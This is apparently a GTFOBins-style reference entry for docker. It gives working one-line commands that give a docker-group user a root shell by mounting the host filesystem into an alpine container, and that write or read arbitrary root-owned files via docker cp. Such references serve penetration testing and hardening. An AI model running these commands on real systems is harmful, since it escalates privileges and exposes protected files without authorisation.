---
description: |
  This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.
functions:
  shell:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  file-write:
    - description: Write any file by copying it to an existing container and back to the target destination on the host. The file will be owned by root.
      code: |
        CONTAINER_ID=existing-docker-container
        echo "sensitive config" > /tmp/file.txt
        sudo docker cp /tmp/file.txt $CONTAINER_ID:/tmp/file.txt
        sudo docker cp $CONTAINER_ID:/tmp/file.txt /target/destination.txt
  file-read:
    - description: Read any file by copying it to an existing container and back to a new location on the host.
      code: |
        CONTAINER_ID=existing-docker-container
        sudo docker cp /root/protected.txt $CONTAINER_ID:/tmp/file.txt
        sudo docker cp $CONTAINER_ID:/tmp/file.txt /home/user/file.txt
        cat /home/user/file.txt
  sudo:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  suid:
    - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
      code: ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
---
